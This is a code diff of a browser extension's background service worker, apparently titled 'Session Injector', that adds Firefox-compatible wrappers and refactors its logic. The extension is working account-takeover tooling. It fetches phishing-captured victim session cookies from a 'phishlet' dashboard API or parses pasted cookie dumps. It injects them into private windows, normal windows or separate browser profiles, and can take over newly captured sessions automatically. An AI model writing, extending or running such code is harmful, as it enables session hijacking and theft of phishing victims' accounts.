@@ -1,20 +1,21 @@
 'use strict';
 /* ============================================================================
-   Session Injector - background service worker (MV3)
+   Session Injector - background service worker.
+
+   Cross-browser note: Chrome's `chrome.*` returns promises when no callback is
+   given, Firefox's does not (Firefox only promises on `browser.*`). Everything
+   here therefore goes through small callback wrappers, which behave identically
+   in both. Without them the whole worker breaks on Firefox.
 
    Window targets
    --------------
-   The operator picks where a victim session should live:
-
+     normal     a normal window in your profile (shares your jar)
      incognito  a separate cookie jar, so nothing you are signed into is touched
-     normal     a normal window in your profile (shares your jar, like before)
      here       reuse the current tab, same jar, no new window
+     profile    a real, separate browser profile (needs the native host)
 
    Only one victim is live per jar, by nature of cookies. Switching victims
    clears the union of the previous and new domains first, so nothing merges.
-
-   Windows get a name (defaults to the victim address) which is applied to the
-   pinned session card and to a tab group, so several windows are tellable apart.
    ========================================================================== */
 
 const SCHEMA = 2;
@@ -42,10 +43,75 @@ function normMode(m) {
   return 'normal';
 }
 
+/* ------------------------------------------------- chrome api, both engines */
+function call(fn, obj, args) {
+  return new Promise(function (res) {
+    try {
+      fn.apply(obj, (args || []).concat([function (r) {
+        void (chrome.runtime && chrome.runtime.lastError); // suppress the unchecked warning
+        res(r);
+      }]));
+    } catch (e) { res(undefined); }
+  });
+}
+const cookiesAll = (f) => call(chrome.cookies.getAll, chrome.cookies, [f]);
+const cookieSet = (d) => call(chrome.cookies.set, chrome.cookies, [d]);
+const cookieDel = (d) => call(chrome.cookies.remove, chrome.cookies, [d]);
+const winAll = () => call(chrome.windows.getAll, chrome.windows, [{}]);
+const tabsQuery = (f) => call(chrome.tabs.query, chrome.tabs, [f]);
+const tabsCreate = (o) => call(chrome.tabs.create, chrome.tabs, [o]);
+const tabsUpdate = (id, o) => call(chrome.tabs.update, chrome.tabs, [id, o]);
+const storeGet = (keys) => call(chrome.storage.local.get, chrome.storage.local, [keys]).then((r) => r || {});
+const storeSet = (o) => call(chrome.storage.local.set, chrome.storage.local, [o]);
+const storeRemove = (k) => call(chrome.storage.local.remove, chrome.storage.local, [k]);
+const winUpdate = (id, o) => call(chrome.windows.update, chrome.windows, [id, o]);
+const winRemove = (id) => call(chrome.windows.remove, chrome.windows, [id]);
+
+// windows.create must be able to *fail* (incognito can be refused)
+function createWindow(opts) {
+  return new Promise(function (res, rej) {
+    try {
+      chrome.windows.create(opts, function (w) {
+        const err = chrome.runtime.lastError;
+        if (err || !w) rej(new Error(err ? err.message : 'window could not be created'));
+        else res(w);
+      });
+    } catch (e) { rej(e); }
+  });
+}
+
+/* ---------------------------------------------------------------- settings */
+async function getSettings() {
+  const got = await storeGet(K.settings);
+  const raw = got[K.settings] || {};
+  const s = Object.assign({}, DEFAULTS, raw);
+  if (raw.schema !== SCHEMA) {
+    // v2.0 shipped incognito as the automatic default and stored it as
+    // "isolated". Migrate exactly that legacy value once.
+    if (raw.mode === 'isolated') s.mode = 'normal';
+    s.schema = SCHEMA;
+    await storeSet({ [K.settings]: s });
+  }
+  s.mode = normMode(s.mode);
+  return s;
+}
+async function setSettings(patch) {
+  const next = Object.assign({}, await getSettings(), patch);
+  if (next.mode) next.mode = normMode(next.mode);
+  await storeSet({ [K.settings]: next });
+  return next;
+}
+
+function badge(text, color) {
+  try {
+    chrome.action.setBadgeText({ text: text || '' }, function () { void chrome.runtime.lastError; });
+    if (color) chrome.action.setBadgeBackgroundColor({ color }, function () { void chrome.runtime.lastError; });
+  } catch (e) { /* cosmetic */ }
+}
+
 /* --------------------------------------------------------- native host ---- */
-// A real browser profile can only be created by a new browser process, so a small
-// native-messaging host does the launching (see extension/host). Everything degrades
-// to a normal window when it is not installed.
+// A real browser profile can only be created by a new browser process, so a
+// small native-messaging host does the launching (see extension/host).
 let hostInfo = null;
 
 async function browserHint() {
@@ -58,30 +124,30 @@ async function browserHint() {
   } catch (e) { /* not brave */ }
   const ua = navigator.userAgent || '';
   if (/Edg\//.test(ua)) return 'edge';
+  if (/Firefox\//.test(ua)) return 'firefox';
   return 'chrome';
 }
 
 function sendNative(msg) {
-  return new Promise((resolve) => {
+  return new Promise(function (res) {
     try {
-      chrome.runtime.sendNativeMessage(HOST, msg, (r) => {
+      chrome.runtime.sendNativeMessage(HOST, msg, function (r) {
         const err = chrome.runtime.lastError;
-        if (err) resolve({ error: err.message });
-        else resolve(r || {});
+        res(err ? { error: err.message } : (r || {}));
       });
-    } catch (e) { resolve({ error: String(e.message || e) }); }
+    } catch (e) { res({ error: String((e && e.message) || e) }); }
   });
 }
 
 async function pingHost() {
   if (hostInfo) return hostInfo;
   const r = await sendNative({ action: 'ping', browserHint: await browserHint() });
-  hostInfo = r && r.ok ? r : { error: r.error || 'host not installed', ok: false };
+  hostInfo = (r && r.ok) ? r : { error: r.error || 'host not installed', ok: false };
   return hostInfo;
 }
 
-// Profiles need the host AND a browser that can force-load an extension into a
-// new profile. Firefox cannot (no --load-extension), so it uses a window.
+// A profile needs the host AND a browser that can force-load an extension into a
+// fresh profile. Firefox cannot (no --load-extension).
 async function profileAllowed() {
   const h = await pingHost();
   return !!(h.ok && h.canProfile === true);
@@ -91,67 +157,28 @@ function b64url(str) {
   return btoa(unescape(encodeURIComponent(str))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
 }
 
-// launch a dedicated profile via the host; returns null when unavailable
 async function launchProfile(payload, label) {
   const info = await pingHost();
   if (!info.ok) return null;
   const packed = b64url(JSON.stringify({ u: payload.target_url, n: label, c: payload.cookies || [] }));
-  const r = await sendNative({
-    action: 'launch',
-    name: label,
-    browserHint: (await browserHint()),
-    payload: packed,
-  });
+  const r = await sendNative({ action: 'launch', name: label, browserHint: await browserHint(), payload: packed });
   if (r.error) return { error: r.error };
   return r;
 }
 
-/* ---------------------------------------------------------------- settings */
-async function getSettings() {
-  const got = await chrome.storage.local.get(K.settings);
-  const raw = got[K.settings] || {};
-  const s = Object.assign({}, DEFAULTS, raw);
-  if (raw.schema !== SCHEMA) {
-    // v2.0 shipped incognito as the automatic default and stored it as
-    // "isolated". The operator asked for plain windows, so migrate exactly that
-    // legacy value once. A deliberate v2.1 "incognito" choice is kept.
-    if (raw.mode === 'isolated') s.mode = 'normal';
-    s.schema = SCHEMA;
-    await chrome.storage.local.set({ [K.settings]: s });
-  }
-  s.mode = normMode(s.mode);
-  return s;
-}
-async function setSettings(patch) {
-  const next = Object.assign({}, await getSettings(), patch);
-  if (next.mode) next.mode = normMode(next.mode);
-  await chrome.storage.local.set({ [K.settings]: next });
-  return next;
-}
-
-function badge(text, color) {
-  try {
-    chrome.action.setBadgeText({ text: text || '' });
-    if (color) chrome.action.setBadgeBackgroundColor({ color });
-  } catch (e) { /* cosmetic */ }
-}
-
 /* ------------------------------------------------------------ window book */
-async function winMap() { return (await chrome.storage.local.get(K.wins))[K.wins] || {}; }
+async function winMap() { return (await storeGet(K.wins))[K.wins] || {}; }
 async function saveWinMap(m) {
-  if (Object.keys(m).length) await chrome.storage.local.set({ [K.wins]: m });
-  else await chrome.storage.local.remove(K.wins);
+  if (Object.keys(m).length) await storeSet({ [K.wins]: m });
+  else await storeRemove(K.wins);
 }
 
 async function liveWindow(kind) {
   const map = await winMap();
   const e = map[kind];
   if (!e) return null;
-  try {
-    // getAll() never throws for a missing id, unlike get()
-    const all = await chrome.windows.getAll();
-    if (all.some((w) => w.id === e.id)) return { id: e.id, kind: e.kind || kind };
-  } catch (err) { /* treat as gone */ }
+  const all = (await winAll()) || [];
+  if (all.some((w) => w.id === e.id)) return { id: e.id, kind: e.kind || kind };
   delete map[kind];
   await saveWinMap(map);
   return null;
@@ -159,8 +186,7 @@ async function liveWindow(kind) {
 
 async function liveWindows() {
   const out = [];
-  for (const k of MODES) {
-    if (k === 'here') continue;
+  for (const k of ['incognito', 'normal']) {
     const w = await liveWindow(k);
     if (w) out.push({ id: w.id, kind: k, actual: w.kind });
   }
@@ -177,15 +203,13 @@ async function ensureWindow(kind) {
   let actual = want;
   if (want === 'incognito') {
     try {
-      w = await chrome.windows.create(Object.assign({ incognito: true }, base));
+      w = await createWindow(Object.assign({ incognito: true }, base));
     } catch (e) {
-      // incognito unavailable (policy / "allowed in private" off): use a normal
-      // window, but remember that we degraded so the UI can say so
-      actual = 'normal';
-      w = await chrome.windows.create(base);
+      actual = 'normal'; // private windows refused by policy / by the user
+      w = await createWindow(base);
     }
   } else {
-    w = await chrome.windows.create(base);
+    w = await createWindow(base);
   }
   const map = await winMap();
   map[want] = { id: w.id, kind: actual };
@@ -193,38 +217,29 @@ async function ensureWindow(kind) {
   return { id: w.id, kind: actual, degraded: actual !== want };
 }
 
-async function touchedMap() { return (await chrome.storage.local.get(K.touched))[K.touched] || {}; }
-async function saveTouched(m) { await chrome.storage.local.set({ [K.touched]: m }); }
-function allTouched(m) { return Object.keys(m || {}).reduce((a, k) => a.concat(m[k]), []); }
-async function storeIdFor(name) { return name === 'incognito' ? await isolatedStoreId() : undefined; }
-
-chrome.windows.onRemoved.addListener(async (id) => {
-  const map = await winMap();
-  let hit = false;
-  for (const k of Object.keys(map)) {
-    if (map[k] && map[k].id === id) { delete map[k]; hit = true; }
-  }
-  if (hit) {
-    await saveWinMap(map);
-    const got = await chrome.storage.local.get(K.active);
-    if (got[K.active] && got[K.active].winId === id) {
-      await chrome.storage.local.remove([K.active, K.touched]);
+chrome.windows.onRemoved.addListener(function (id) {
+  (async function () {
+    const map = await winMap();
+    let hit = false;
+    for (const k of Object.keys(map)) {
+      if (map[k] && map[k].id === id) { delete map[k]; hit = true; }
     }
-  }
+    if (!hit) return;
+    await saveWinMap(map);
+    const got = await storeGet(K.active);
+    if (got[K.active] && got[K.active].winId === id) await storeRemove([K.active, K.touched]);
+  })();
 });
 
-// Chrome exposes the incognito store as an opaque id (in practice "1"). Probe for
-// it instead of hardcoding, and cache the answer.
+// The private store id is opaque; probe for it and cache the answer.
 async function isolatedStoreId() {
-  const got = await chrome.storage.local.get(K.store);
+  const got = await storeGet(K.store);
   if (got[K.store]) return got[K.store];
   let id = '1';
-  try {
-    const all = await chrome.cookies.getAll({});
-    const inc = all.find((c) => c.storeId && c.storeId !== '0');
-    if (inc) id = inc.storeId;
-  } catch (e) { /* default is fine */ }
-  await chrome.storage.local.set({ [K.store]: id });
+  const all = (await cookiesAll({})) || [];
+  const inc = all.find((c) => c.storeId && c.storeId !== '0');
+  if (inc) id = inc.storeId;
+  await storeSet({ [K.store]: id });
   return id;
 }
 
@@ -269,18 +284,12 @@ function domainsOf(cookies) {
 async function clearDomains(domains, storeId) {
   let removed = 0;
   for (const d of domains) {
-    let existing = [];
-    try {
-      const filter = storeId ? { domain: d, storeId } : { domain: d };
-      existing = await chrome.cookies.getAll(filter);
-    } catch (e) { existing = []; }
+    const filter = storeId ? { domain: d, storeId } : { domain: d };
+    const existing = (await cookiesAll(filter)) || [];
     for (const c of existing) {
-      try {
-        const opts = { url: cookieURL(c), name: c.name };
-        if (storeId) opts.storeId = storeId;
-        await chrome.cookies.remove(opts);
-        removed++;
-      } catch (e) { /* already gone */ }
+      const opts = { url: cookieURL(c), name: c.name };
+      if (storeId) opts.storeId = storeId;
+      if (await cookieDel(opts)) removed++;
     }
   }
   return removed;
@@ -291,9 +300,9 @@ async function applyCookies(cookies, storeId, clearList) {
   res.cleared = await clearDomains(clearList || domainsOf(cookies), storeId);
   for (const c of cookies) {
     try {
-      const r = await chrome.cookies.set(cookieDetails(c, storeId));
+      const r = await cookieSet(cookieDetails(c, storeId));
       if (r) res.success++;
-      else { res.failed++; res.errors.push(c.name + ' @ ' + c.domain + ': rejected'); }
+      else { res.failed++; res.errors.push(c.name + ' @ ' + c.domain + ': rejected' + (storeId ? ' (store ' + storeId + ')' : '')); }
     } catch (e) {
       res.failed++;
       res.errors.push(c.name + ' @ ' + c.domain + ': ' + e.message);
@@ -310,7 +319,6 @@ function labelFor(payload, st, opts) {
     (payload.phishlet ? '(' + payload.phishlet + ')' : '') ||
     ('session ' + payload.session_id);
   const pre = (st.namePrefix || '').trim();
-  // "camp-" + alice -> camp-alice, but "camp" + alice -> camp alice
   const joined = pre ? (/[-_.\/]$/.test(pre) ? pre + who : pre + ' ' + who) : who;
   return joined.trim().slice(0, 60);
 }
@@ -333,21 +341,24 @@ function infoOf(payload, where, label, winId) {
 /* ------------------------------------------------------------------- window */
 async function openTabs(winId, payload, label, useGroups) {
   const cardURL = chrome.runtime.getURL('session-card.html');
-  const tabs = await chrome.tabs.query({ windowId: winId });
+  const tabs = (await tabsQuery({ windowId: winId })) || [];
   let card = tabs.find((t) => t.url && t.url.indexOf(cardURL) === 0);
-  if (!card) card = await chrome.tabs.create({ windowId: winId, url: cardURL, pinned: true, index: 0 });
-  let target = tabs.find((t) => t.id !== card.id && t.url && t.url.indexOf(cardURL) !== 0);
-  if (target) await chrome.tabs.update(target.id, { url: payload.target_url, active: true });
-  else target = await chrome.tabs.create({ windowId: winId, url: payload.target_url, active: true });
-  // optional: label the window with a tab group (Firefox has no tabGroups API)
+  if (!card) card = await tabsCreate({ windowId: winId, url: cardURL, pinned: true, index: 0 });
+  let target = tabs.find((t) => t && card && t.id !== card.id && t.url && t.url.indexOf(cardURL) !== 0);
+  if (target) await tabsUpdate(target.id, { url: payload.target_url, active: true });
+  else target = await tabsCreate({ windowId: winId, url: payload.target_url, active: true });
   if (useGroups && chrome.tabs.group) {
     try {
-      const gid = await chrome.tabs.group({ tabIds: [card.id, target.id], createProperties: { windowId: winId } });
-      if (chrome.tabGroups) await chrome.tabGroups.update(gid, { title: label, color: 'blue' });
+      const gid = await call(chrome.tabs.group, chrome.tabs, [{ tabIds: [card.id, target.id], createProperties: { windowId: winId } }]);
+      if (gid !== undefined && chrome.tabGroups) await call(chrome.tabGroups.update, chrome.tabGroups, [gid, { title: label, color: 'blue' }]);
     } catch (e) { /* the pinned card still carries the name */ }
   }
   return target;
 }
+
+async function touchedMap() { return (await storeGet(K.touched))[K.touched] || {}; }
+function allTouched(m) { return Object.keys(m || {}).reduce((a, k) => a.concat(m[k]), []); }
+async function storeIdFor(name) { return name === 'incognito' ? await isolatedStoreId() : undefined; }
 
 /* ----------------------------------------------------------------- takeover */
 async function takeover(payload, mode, opts) {
@@ -358,86 +369,67 @@ async function takeover(payload, mode, opts) {
   let res;
   let winId = null;
 
-  // Firefox cannot have the extension force-loaded into a fresh profile, so a
-  // profile request there becomes a window rather than a blank browser.
   if (where === 'profile' && !(await profileAllowed())) where = 'normal';
 
   if (where === 'here') {
     res = await applyCookies(cookies, undefined);
     res.where = 'this profile';
-    if (payload.target_url) await chrome.tabs.create({ url: payload.target_url, active: true });
+    if (payload.target_url) await tabsCreate({ url: payload.target_url, active: true });
   } else if (where === 'profile') {
-    const r = await launchProfile(Object.assign({}, payload, { cookies: cookies }), label);
-    if (r && !r.error) {
-      res = { success: cookies.length, failed: 0, cleared: 0, errors: [], where: 'own profile', profile: r.profile };
-    } else if (r && r.error) {
-      return { error: 'profile launch failed: ' + r.error };
-    } else {
-      // host missing -> behave like a normal window
-      const win = await ensureWindow('normal');
-      winId = win.id;
-      res = await applyCookies(cookies, undefined, domainsOf(cookies));
-      res.where = 'normal window (host not installed)';
-      if (payload.target_url) await openTabs(winId, payload, label, !!st.tabGroups);
-      await chrome.windows.update(winId, { focused: true });
-    }
-    await chrome.storage.local.set({ [K.active]: infoOf(payload, where, label, winId) });
+    const r = await launchProfile(payload, label);
+    if (r && r.error) return { error: 'profile launch failed: ' + r.error };
+    res = { success: cookies.length, failed: 0, cleared: 0, errors: [], where: 'own profile', profile: r.profile };
+    await storeSet({ [K.active]: infoOf(payload, where, label, null) });
   } else {
     const win = await ensureWindow(where);
     winId = win.id;
     const sname = win.kind === 'incognito' ? 'incognito' : 'default';
     const storeId = await storeIdFor(sname);
-    // clear everything we ever wrote into THIS jar plus the new domains, so
-    // switching victims (or modes) never merges two people's cookies
     const touched = await touchedMap();
     const domains = Array.from(new Set(allTouched(touched).concat(domainsOf(cookies))));
     res = await applyCookies(cookies, storeId, domains);
-    res.where = win.kind === 'incognito' ? 'incognito window' : 'normal window';
+    res.where = win.kind === 'incognito' ? 'private window' : 'normal window';
     res.degraded = !!win.degraded;
     touched[sname] = domains;
-    await chrome.storage.local.set({
-      [K.touched]: touched,
-      [K.active]: infoOf(payload, where, label, winId),
-    });
+    await storeSet({ [K.touched]: touched, [K.active]: infoOf(payload, where, label, winId) });
     if (payload.target_url) await openTabs(winId, payload, label, !!st.tabGroups);
-    await chrome.windows.update(winId, { focused: true });
+    await winUpdate(winId, { focused: true });
   }
 
   const info = infoOf(payload, where, label, winId);
   await remember(info, payload);
-  await chrome.storage.local.set({ [K.last]: Object.assign({}, info, { failed: res.failed, where: res.where }) });
+  await storeSet({ [K.last]: Object.assign({}, info, { failed: res.failed, where: res.where }) });
 
   if (res.success > 0) badge(String(res.success), '#2563eb');
-  setTimeout(() => badge('', null), 4000);
+  setTimeout(function () { badge('', null); }, 4000);
   return res;
 }
 
 async function remember(info, payload) {
-  const got = await chrome.storage.local.get(K.recent);
+  const got = await storeGet(K.recent);
   const list = (got[K.recent] || []).filter((x) => x.id !== info.id);
   list.unshift(Object.assign({}, info, { cookies: payload.cookies || [], target_url: payload.target_url || '' }));
-  await chrome.storage.local.set({ [K.recent]: list.slice(0, RECENT_MAX) });
+  await storeSet({ [K.recent]: list.slice(0, RECENT_MAX) });
 }
 
-/* ------------------------------------------------------------- paste-in ---- */
-// Accepts Cookie-Editor style JSON, our export shape, a bare {name: value} map,
-// a raw "Cookie:" header, or a document.cookie string.
+/* -------------------------------------------------------------- paste-in --- */
 function normalizeCookie(raw, host) {
   if (!raw || typeof raw !== 'object') return null;
   const name = String(raw.name == null ? '' : raw.name).trim();
   if (!name) return null;
+  const domain = String(raw.domain || raw.host || host || '').trim();
+  if (!domain) return null;
   const c = {
     name: name,
     value: raw.value == null ? '' : String(raw.value),
-    domain: String(raw.domain || raw.host || host || '').trim(),
+    domain: domain,
     path: raw.path || '/',
     secure: !!raw.secure,
     httpOnly: !!raw.httpOnly,
     sameSite: raw.sameSite || 'Lax',
   };
-  if (!c.domain) return null;
-  if (raw.expirationDate) c.expirationDate = Math.floor(Number(raw.expirationDate)) || 0;
-  if (Number.isNaN(c.expirationDate)) delete c.expirationDate;
+  const exp = Math.floor(Number(raw.expirationDate));
+  if (raw.expirationDate && exp > 0) c.expirationDate = exp;
   if (raw.session || !c.expirationDate) c.session = true;
   return c;
 }
@@ -458,23 +450,21 @@ function parseCookies(text, targetUrl) {
     if (!arr || !arr.length) { out.error = 'no cookies found in the JSON'; return out; }
     out.format = 'json';
     out.cookies = arr.map((c) => normalizeCookie(c, out.host)).filter(Boolean);
-    if (!out.cookies.length) { out.error = 'no usable cookies in the JSON (each needs a name and a domain)'; return out; }
-    if (out.cookies.length > 500) out.cookies = out.cookies.slice(0, 500);
-    return out;
+    if (!out.cookies.length) { out.error = 'no usable cookies (each needs a name and a domain)'; return out; }
+  } else {
+    out.format = 'text';
+    if (!out.host) { out.error = 'plain text needs a target URL so the domain is known'; return out; }
+    const flat = body.replace(/^cookie\s*:\s*/i, '').replace(/\r/g, '');
+    for (const part of flat.split(/[;\n]+/)) {
+      const s = part.trim();
+      if (!s) continue;
+      const i = s.indexOf('=');
+      if (i <= 0) continue;
+      const c = normalizeCookie({ name: s.slice(0, i), value: s.slice(i + 1) }, out.host);
+      if (c) out.cookies.push(c);
+    }
+    if (!out.cookies.length) { out.error = 'no name=value pairs found'; return out; }
   }
-
-  out.format = 'text';
-  if (!out.host) { out.error = 'plain text needs a target URL so the domain is known'; return out; }
-  const flat = body.replace(/^cookie\s*:\s*/i, '').replace(/\r/g, '');
-  for (const part of flat.split(/[;\n]+/)) {
-    const s = part.trim();
-    if (!s) continue;
-    const i = s.indexOf('=');
-    if (i <= 0) continue;
-    const c = normalizeCookie({ name: s.slice(0, i), value: s.slice(i + 1) }, out.host);
-    if (c) out.cookies.push(c);
-  }
-  if (!out.cookies.length) { out.error = 'no name=value pairs found'; return out; }
   if (out.cookies.length > 500) out.cookies = out.cookies.slice(0, 500);
   return out;
 }
@@ -486,7 +476,7 @@ async function takeFromText(msg) {
   if (p.error) return { error: p.error };
   const payload = {
     session_id: 'paste-' + Date.now().toString(36),
-    phishlet: (msg.phishlet || 'pasted'),
+    phishlet: msg.phishlet || 'pasted',
     username: (msg.name || '').trim(),
     target_url: target,
     cookies: p.cookies,
@@ -496,23 +486,18 @@ async function takeFromText(msg) {
   return Object.assign({ parsed: p.cookies.length, format: p.format, domains: domainsOf(p.cookies) }, r);
 }
 
-/* ------------------------------------------- optional direct dashboard fetch */
+/* ----------------------------------------- optional direct dashboard fetch */
 function b64(s) {
   try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); }
-}
-function authHeaders(st) {
-  return (st.user || st.pass) ? { Authorization: 'Basic ' + b64(st.user + ':' + st.pass) } : {};
 }
 
 async function fetchSession(id) {
   const st = await getSettings();
   const base = (st.dashboardUrl || '').replace(/\/+$/, '');
   if (!base) return { error: 'no dashboard url set' };
+  const headers = (st.user || st.pass) ? { Authorization: 'Basic ' + b64(st.user + ':' + st.pass) } : {};
   try {
-    const r = await fetch(base + '/api/v1/sessions/' + encodeURIComponent(id) + '/cookies', {
-      credentials: 'include',
-      headers: authHeaders(st),
-    });
+    const r = await fetch(base + '/api/v1/sessions/' + encodeURIComponent(id) + '/cookies', { credentials: 'include', headers: headers });
     if (!r.ok) return { error: 'dashboard returned ' + r.status };
     const d = await r.json();
     if (!d.count) return { error: 'session has no cookies' };
@@ -522,13 +507,13 @@ async function fetchSession(id) {
   }
 }
 
-/* ------------------------------------------------------------ auto takeover */
+/* ------------------------------------------------------------- auto takeover */
 async function seenNewSessions(list) {
-  const got = await chrome.storage.local.get(K.seen);
+  const got = await storeGet(K.seen);
   const known = got[K.seen] || null;
   const now = list.map((s) => s.id);
   const fresh = known ? list.filter((s) => known.indexOf(s.id) === -1) : [];
-  await chrome.storage.local.set({ [K.seen]: now.concat(known || []).slice(0, SEEN_MAX) });
+  await storeSet({ [K.seen]: now.concat(known || []).slice(0, SEEN_MAX) });
   return fresh;
 }
 
@@ -551,18 +536,17 @@ async function onMessage(msg) {
     case 'sessions': {
       const fresh = await seenNewSessions(msg.list || []);
       const st = await getSettings();
-      // only count it as a capture when the login is actually confirmed
-      const usable = (x) => x.usable === undefined ? !!x.has_tokens : !!x.usable;
-      const withTokens = fresh.filter(usable);
-      if (withTokens.length) {
-        badge(String(withTokens.length), '#22c55e');
-        setTimeout(() => badge('', null), 6000);
+      const usable = (x) => (x.usable === undefined ? !!x.has_tokens : !!x.usable);
+      const ready = fresh.filter(usable);
+      if (ready.length) {
+        badge(String(ready.length), '#22c55e');
+        setTimeout(function () { badge('', null); }, 6000);
       }
-      if (st.autoOpen && withTokens.length) {
-        const d = await fetchSession(withTokens[0].id);
+      if (st.autoOpen && ready.length) {
+        const d = await fetchSession(ready[0].id);
         if (!d.error) await takeover(d, st.mode);
       }
-      return { fresh: withTokens.length };
+      return { fresh: ready.length };
     }
     case 'dashboard':
       if (msg.url) await setSettings({ dashboardUrl: msg.url });
@@ -570,28 +554,32 @@ async function onMessage(msg) {
     case 'settings':
       return await setSettings(msg.patch || {});
     case 'rename': {
-      const got = await chrome.storage.local.get(K.active);
+      const got = await storeGet(K.active);
       if (!got[K.active]) return { error: 'nothing is live' };
       const name = String(msg.name || '').trim().slice(0, 60);
       const next = Object.assign({}, got[K.active], { name: name });
-      await chrome.storage.local.set({ [K.active]: next });
-      if (next.winId) {
+      await storeSet({ [K.active]: next });
+      if (next.winId && chrome.tabs.group) {
         try {
-          const tabs = await chrome.tabs.query({ windowId: next.winId });
+          const tabs = (await tabsQuery({ windowId: next.winId })) || [];
           const g = tabs.find((t) => t.groupId && t.groupId !== -1);
-          if (g) await chrome.tabGroups.update(g.groupId, { title: name });
-        } catch (e) { /* group optional */ }
+          if (g) await call(chrome.tabGroups.update, chrome.tabGroups, [g.groupId, { title: name }]);
+        } catch (e) { /* optional */ }
       }
       return { name: name };
     }
     case 'state': {
       const st = await getSettings();
       const won = await liveWindows();
-      const got = await chrome.storage.local.get([K.recent, K.active, K.last]);
+      const got = await storeGet([K.recent, K.active, K.last]);
       const host = await pingHost();
-    return {
-        settings: st, windows: won, recent: got[K.recent] || [], active: got[K.active] || null, last: got[K.last] || null,
-        host: { ok: !!host.ok, canProfile: host.canProfile === true, family: host.family || '', browser: host.browser || '', error: host.error || '', extId: host.extId || '' },
+      return {
+        settings: st,
+        windows: won,
+        recent: got[K.recent] || [],
+        active: got[K.active] || null,
+        last: got[K.last] || null,
+        host: { ok: !!host.ok, canProfile: host.canProfile === true, family: host.family || '', browser: host.browser || '', error: host.error || '' },
       };
     }
     case 'hostInstall': {
@@ -606,12 +594,12 @@ async function onMessage(msg) {
       for (const sname of Object.keys(touched)) {
         cleared += await clearDomains(touched[sname], await storeIdFor(sname));
       }
-      await chrome.storage.local.remove([K.active, K.touched]);
+      await storeRemove([K.active, K.touched]);
       return { cleared: cleared };
     }
     case 'closeWindows': {
       const won = await liveWindows();
-      for (const w of won) { try { await chrome.windows.remove(w.id); } catch (e) { } }
+      for (const w of won) await winRemove(w.id);
       return { closed: won.length };
     }
     default:
@@ -619,7 +607,7 @@ async function onMessage(msg) {
   }
 }
 
-chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
-  onMessage(msg).then(sendResponse).catch((e) => sendResponse({ error: String((e && e.message) || e) }));
-  return true; // async
+chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
+  onMessage(msg).then(sendResponse).catch(function (e) { sendResponse({ error: String((e && e.message) || e) }); });
+  return true; // async response
 });
